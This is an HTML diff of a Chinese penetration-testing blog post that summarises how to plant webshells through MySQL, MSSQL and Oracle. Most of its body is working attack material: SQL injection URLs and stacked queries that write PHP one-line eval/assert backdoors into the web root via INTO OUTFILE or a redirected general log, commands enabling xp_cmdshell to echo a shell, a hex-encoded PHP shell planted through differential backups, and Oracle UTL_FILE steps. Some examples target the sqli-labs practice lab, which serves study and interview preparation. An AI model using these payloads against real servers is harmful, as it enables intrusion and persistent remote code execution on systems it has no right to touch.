@@ -1,0 +1,361 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>三大数据库写webshell正确姿势 | Fstraw Blog</title><meta name="keywords" content="Sql"><meta name="author" content="Fstraw"><meta name="copyright" content="Fstraw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考文章： https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;362 https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;178866188 两篇文章总结归纳为这篇文章，其中 Mysql 可以看第一篇文章，Mssql 和 Oracle 可以看第二篇文章。 因为是总结的，所以有些地方可能有纰漏，如果遇到问题，还请自行判断和解决。  Mysql基本条件 对web目录有写权限，一般">
+<meta property="og:type" content="article">
+<meta property="og:title" content="三大数据库写webshell正确姿势">
+<meta property="og:url" content="https://ccc-f.github.io/posts/ffe60f3c.html">
+<meta property="og:site_name" content="Fstraw Blog">
+<meta property="og:description" content="参考文章： https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;362 https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;178866188 两篇文章总结归纳为这篇文章，其中 Mysql 可以看第一篇文章，Mssql 和 Oracle 可以看第二篇文章。 因为是总结的，所以有些地方可能有纰漏，如果遇到问题，还请自行判断和解决。  Mysql基本条件 对web目录有写权限，一般">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ccc-f.github.io/img/backup.jpg">
+<meta property="article:published_time" content="2022-11-03T15:03:50.831Z">
+<meta property="article:modified_time" content="2023-04-28T09:21:02.844Z">
+<meta property="article:author" content="Fstraw">
+<meta property="article:tag" content="Sql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ccc-f.github.io/img/backup.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://ccc-f.github.io/posts/ffe60f3c"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="google3c676eb36348f5df"/><meta name="baidu-site-verification" content="de191936ea3ee4fffaba389d103fb230"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.1.1/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/js/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?32fff2d27aa7e0c7fad7396cabeaa45b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"已经超过","messageNext":"天，自上次更新后，文章内容可能已经过时。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: Fstraw","link":"链接: ","source":"来源: Fstraw Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '三大数据库写webshell正确姿势',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-28 17:21:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/butterflyChange/css/myfont.css"<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Fstraw Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">123</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backup.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fstraw Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">三大数据库写webshell正确姿势<a class="post-edit-link" href="https://github.com/ccc-f/ccc-f.github.io/edit/master/posts/ffe60f3c.html" rel="external nofollow noreferrer" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-03T15:03:50.831Z" title="发表于 2022-11-03 23:03:50">2022-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-28T09:21:02.844Z" title="更新于 2023-04-28 17:21:02">2023-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="三大数据库写webshell正确姿势"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/ffe60f3c.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/ffe60f3c.html" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://forum.butian.net/share/362">https://forum.butian.net/share/362</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://zhuanlan.zhihu.com/p/178866188">https://zhuanlan.zhihu.com/p/178866188</a></p>
+<p>两篇文章总结归纳为这篇文章，其中 Mysql 可以看第一篇文章，Mssql 和 Oracle 可以看第二篇文章。</p>
+<p>因为是总结的，所以有些地方可能有纰漏，如果遇到问题，还请自行判断和解决。</p>
+</blockquote>
+<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="基本条件"><a href="#基本条件" class="headerlink" title="基本条件"></a>基本条件</h2><ol>
+<li>对web目录有写权限，一般 MS 系统都有，但 Linux 系统一般都是rwxr-xr-x，组跟其他用户都没有权限写操作</li>
+<li>知道物理路径</li>
+<li>数据库的当前用户为ROOT或拥有FILE权限</li>
+<li>PHP的GPC参数为off状态</li>
+</ol>
+<h2 id="日志写马"><a href="#日志写马" class="headerlink" title="日志写马"></a>日志写马</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
+<li><p>全局变量<code>general_log</code>为ON</p>
+</li>
+<li><p>需要<code>secure_file_priv</code>为空,即<code>secure_file_priv=&quot;&quot;</code>。</p>
+</li>
+<li><p>或<code>secure_file_priv=&quot;D:\&quot;</code>,指定为D盘的的情况下，web搭建的盘也必须是在D盘。</p>
+</li>
+<li><p><code>secure_file_priv</code> 一定不能为 Null</p>
+</li>
+</ol>
+<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p><code>general_log</code>指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭,但是可以通过sql查询设置为 ON</p>
+<p>secure_file_priv&#x3D;”” 就是可以into outfile写入任意磁盘文件。</p>
+<p>secure_file_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量</p>
+<p>知道物理路径（into outfile ‘物理路径’), 这样才能写对目录。</p>
+<p>写入路径的时候，其中路径里的<code>\</code>用<code>\\</code>或者&#x2F;代替，因为<code>\</code>的话会消失一个</p>
+<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>1.先设置<code>general_log</code>为on：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/?id=-1&#x27; union select 1,2,3;set global general_log=&#x27;on&#x27;;--+</span><br></pre></td></tr></table></figure>
+
+<p>2.再设置<code>general_log_file</code>为一个php后缀文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/?id=-1&#x27; union select 1,2,3;set global general_log_file=&#x27;D:\\phpStudy\\PHPTutorial\\WWW\\log.php&#x27;;--+</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>直接访问<code>http://ip/?id=&lt;?php assert($_POST[v]);?&gt;;</code>，因为sql语句不管对错日志都会记录</p>
+</li>
+<li><p>webshell 工具连接 <code>http://ip/log.php</code></p>
+</li>
+</ol>
+<p><strong>直接登录进别人的数据库的时候：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/phpStudy/PHPTutorial/WWW/1.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line">select <span class="string">&#x27;&lt;?php assert($_POST[v]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>查看数据库日志的具体位置，webshell 工具直接连接。</p>
+<h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><ol>
+<li>查看 <code>general_log</code>的状态和 log 文件的位置</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show <span class="keyword">global</span> variables like <span class="string">&quot;%general_log%&quot;</span>;</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                  |</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                    |</span><br><span class="line">| general_log_file | D:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-UQAMJKA.log |</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line"><span class="number">2</span> rows in <span class="title function_ invoke__">set</span> (<span class="number">0.02</span> sec)</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>设置数据库日志的具体到web目录那里：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/phpStudy/PHPTutorial/WWW/1.log&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> rows <span class="title function_ invoke__">affected</span> (<span class="number">0.07</span> sec)</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>检查当前用户是否具备写权限:</li>
+</ol>
+<p>select user,file_priv from mysql.user;</p>
+<p>确认其用户的值为Y即代表此用户拥有文件写入权限。</p>
+<h2 id="mysql-into-outfile注射一句话木马"><a href="#mysql-into-outfile注射一句话木马" class="headerlink" title="mysql into outfile注射一句话木马"></a>mysql into outfile注射一句话木马</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol>
+<li>mysql用户拥有file_priv权限</li>
+</ol>
+<p><code>show global variables like &#39;%secure%&#39;</code>;查看into outfile可以写入的磁盘。<br>（1）当secure_file_priv为空，就可以写入磁盘的目录。<br>（2）当secure_file_priv为G:\，就可以写入G盘的文件。<br>（3）当secure_file_priv为null，into outfile就不能写入文件。（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
+<ol start="2">
+<li>能够使用union、或者有堆叠注入、或者已经成功登录到别人的数据库里了</li>
+</ol>
+<p>（1）能够使用union 。（需要mysql 3以上的版本）这个条件是在url里才需要，如果直接登录进别人的数据库，那么就不需要能够使用union了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line">?id=<span class="number">1</span> union select <span class="string">&#x27;&lt;?php @e val($_POST[&#x27;</span>c<span class="string">&#x27;]);?&gt;&#x27;</span> into outfile <span class="string">&quot;C:/phpStudy/WWW/a.php&quot;</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;)) UNION SELECT 1,2,&#x27;</span><span class="meta">&lt;?php</span> @e <span class="title function_ invoke__">val</span>(<span class="variable">$_POST</span>[<span class="string">&quot;v&quot;</span>]);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot; --+</span></span><br></pre></td></tr></table></figure>
+
+<p>（2）或者有堆叠注入，就可以直接<code>?id=1;select &#39;&lt;?php @e val($_POST[&#39;c&#39;]);?&gt;&#39; into outfile &quot;C:/phpStudy/WWW/a.php&quot;</code>这样执行了。</p>
+<p>不过首先要想有堆叠注入的条件，源码中必须要用到<code>mysqli_multi_query()</code>，那么我们此处就可以执行多个sql语句进行注入。一般后台查询数据库使用的语句都是用<code>mysql_query()</code>，所以堆叠注入在mysql上不常见。<code>mysqli_multi_query()</code>可以执行多个sql语句，而<code>mysqli_query()</code>只能执行一个sql语句。</p>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p>（3）再者就是已经成功登录到别人的数据库里了，直接执行<code>select &#39;&lt;?php @e val($_POST[&#39;c&#39;]);?&gt;&#39; into outfile &quot;C:/phpStudy/WWW/a.php&quot;</code></p>
+<h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><p><strong>Union 注入法</strong></p>
+<p>1.判断注入类型</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;</code> 报错<br><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) --+</code> 正常</p>
+<p>2.判断列数</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 3 --+</code> 正常</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 4 --+</code> 报错</p>
+<p>说明存在3列</p>
+<p>3.文件写入</p>
+<p>1.判断注入类型</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;</code> 报错<br><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) --+</code> 正常</p>
+<p>2.判断列数</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 3 --+</code> 正常</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 4 --+</code> 报错</p>
+<p>说明存在3列</p>
+<p>3.文件写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7?id=1&#x27;)) UNION SELECT 1,2,&#x27;&lt;?php @e val($_POST[&quot;v&quot;]);?&gt;&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot; --+</span><br></pre></td></tr></table></figure>
+
+<p>或者<code>&quot;D:/phpStudy/PHPTutorial/WWW/hack.php&quot;</code>，就是不能<code>\</code>，经过测试这样导入不成功。</p>
+<p><strong>堆叠注入法：</strong></p>
+<p>堆叠注入：<code>http://127.0.0.1/sqli-labs-master/Less-40/?id=1&#39;);SELECT &#39;&lt;?php @e val($_POST[&quot;v&quot;]);?&gt;&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot;;--+</code></p>
+<p><strong>直接登录数据库法：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">&quot;&lt;?php @e val(<span class="subst">$_POST</span>[&#x27;xiaohua&#x27;]); ?&gt;&quot;</span></span><br><span class="line">INTO OUTFILE <span class="string">&#x27;/tmp/test1.php&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以用 webshell 管理工具连接了。</p>
+<hr>
+<h1 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h1><h2 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h2><ol>
+<li>有相应的权限db_owner</li>
+<li>获得Web目录的绝对路径</li>
+</ol>
+<h2 id="写入webshell方法"><a href="#写入webshell方法" class="headerlink" title="写入webshell方法"></a>写入webshell方法</h2><p>利用xp_cmdshell命令、<br>差异备份写入shell、<br>log备份写入shell。</p>
+<h2 id="使用XP-cmdshel写入Webshell"><a href="#使用XP-cmdshel写入Webshell" class="headerlink" title="使用XP_cmdshel写入Webshell"></a>使用XP_cmdshel写入Webshell</h2><p>首先我们需要查找网站目录的绝对路径，查找绝对路径的方法有5种：<br>通过报错信息查找；<br>通过目录爆破猜解；<br>通过旁站的目录确定；<br>通过存储过程来搜索；<br>通过读取配置文件查找。</p>
+<p>其中通过存储过程来搜索，SQLServer提供了两种方法：<strong>xp_cmdshell</strong> 和 <strong>xp_dirtree</strong>，一般需要手动开启。<br>命令<code>execute master…xp_dirtree ‘c:’;</code>可以查出所有c:\下的文件、目录、子目录。</p>
+<p>查找网站目录的绝对路径<br>在真实环境中时，我们执行execute可能并不能得到回显信息，但我们可以在注入点处新建一张表，然后将xp_dirtree查询到的信息插入其中，再查询这张表即可得相应的绝对路径了。</p>
+<p><strong>开启 xp_cmdshell</strong></p>
+<p>Xp_cmdshell是一个更为有效的查询绝对路径的函数，但是目前已经被SQLServer默认关闭了，但我们可以使用如下命令启用这个选项。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure ‘show advanced options’,1;//允许修改高级参数RECONFIGURE;</span><br><span class="line">EXEC sp_configure ‘xp_cmdshell’,1;//打开xp_cmdshell扩展RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>未能找到存储过程 ‘master..xp_cmdshell’<br>第一步执行：EXEC sp_addextendedproc xp_cmdshell,@dllname &#x3D;’xplog70.dll’declare @o int<br>第二步执行：sp_addextendedproc ‘xp_cmdshell’,’xpsql70.dll’</p>
+<p>开启了xp_cmsshell之后我们就可以执行CMD命令了，例如:<br>for &#x2F;r c:%i in (1*.php) do @echo %i<br>就可以查询c:\目录下的所有符合1*.php的文件，同理，在实际应用中，我们也是新建一个表，并将xp_cmdshell查询到的信息插入后，再次查询即可。</p>
+<p><strong>使用xp_cmdshell写入WebShell</strong><br>我们可以通过xp_cmdshell执行系统CMD命令，例如我们可以使用CMD中的echo命令，将WebShell的代码写入到网站目录下<br>PAYLOAD：1’;execmaster..xp_cmdshell’echo^&gt;F:\PhpStudy20180211\PHPTutorial\WWW\cmd.php’;</p>
+<h2 id="使用差异备份写入WebShell"><a href="#使用差异备份写入WebShell" class="headerlink" title="使用差异备份写入WebShell"></a>使用差异备份写入WebShell</h2><blockquote>
+<p>实战参考：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.bianchengquan.com/article/198173.html">https://www.bianchengquan.com/article/198173.html</a></p>
+<p>如果能直接使用xp_cmdshell就尽量不要使用差异备份，因为会产生备份文件，如果数据库很大的话，会造成影响</p>
+</blockquote>
+<p>首先对某一数据库进行备份。<br>PAYLOAD：id&#x3D;1’;backup database 库名 to disk&#x3D;‘F:\PhpStudy20180211\PHPTutorial\WWW\back.bak’;</p>
+<p><strong>数据库备份</strong><br>其次将WebShell代码写入数据库中,<br>PAYLOAD：id&#x3D;1’; create table cybk([cmd][image]);#创建一个新表<br>PAYLOAD：id&#x3D;1’;insert into cybk(cmd)<br>vaues(0x3C3F706870206576616C28245F504F53545B2770617373275D293B203F3E);</p>
+<p>#将WebShell的代码转换成ASCII码</p>
+<p>最后将此数据库进行差异备份，这样其中就会包含刚刚写入的WebShell代码。<br>PAYLOAD：id&#x3D;1’; backup database library to disk&#x3D;’F:\PhpStudy20180211\PHPTutorial\WWW\cybk.php’ WITHDIFFERENTIAL,FORMAT;</p>
+<h2 id="使用log备份写入WebShell"><a href="#使用log备份写入WebShell" class="headerlink" title="使用log备份写入WebShell"></a>使用log备份写入WebShell</h2><p>使用Log备份写入WebShell的要求是他的数据库已经备份过，而且要选择完整模式的恢复模式，相比较差异备份而言，使用Log备份文件会小的多。<br>首先需要将数据库设置为完整恢复模式，然后创建一个新表，将WebShell用Ascii编码后写入其中，然后将该数据库的日志信息导出到Web目录，即可。</p>
+<h1 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a>ORACLE</h1><h2 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h2><ol>
+<li><p>有DBA权限</p>
+</li>
+<li><p>获得Web目录的绝对路径</p>
+</li>
+</ol>
+<h2 id="Oracle写入webshell"><a href="#Oracle写入webshell" class="headerlink" title="Oracle写入webshell"></a>Oracle写入webshell</h2><p>首先我们需要创建一个ORACLE的目录对象指向某一路径，在真实环境中需要指向Web目录下，在这里我们将其指向&#x2F;home&#x2F;oracle这一路径下。create or replace directory IST0_DIR as ‘&#x2F;home&#x2F;oracle’;</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%B8%89%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99webshell%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/v2-6abcd86d728afd5c70f1b8fcebd8ac2a_1440w.jpg" alt="img"></p>
+<p>创建好后，我们需要对其进行一下授权过程，让其能够顺利的写入WebShell代码。</p>
+<p>grant read, write on directory IST0_DIR tosystem;</p>
+<p>然后写入文件，定义变量类型为utl_file.file_type，然后将WebShell的代码写入此文件中。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%B8%89%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99webshell%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/v2-b460fa9dc96c7a17da878043105de004_1440w.jpg" alt="img"></p>
+<p>直接访问该文件，即可查看到其中的WebShell代码，如果这个文件是放置在Web目录下的，那么就可以被攻击者成功利用。</p>
+<p>以上就是三大数据库（MySQL、SqlServer、Oracle）写入WebShell的正确姿势</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>技术虽然比较旧，但是算是面试会被经常问到的问题，应该去总结和实验。</p>
+<p>如果可以获取到数据库的用户名和密码的话，就可以直接用工具 MDUT 来进行管理数据库了。</p>
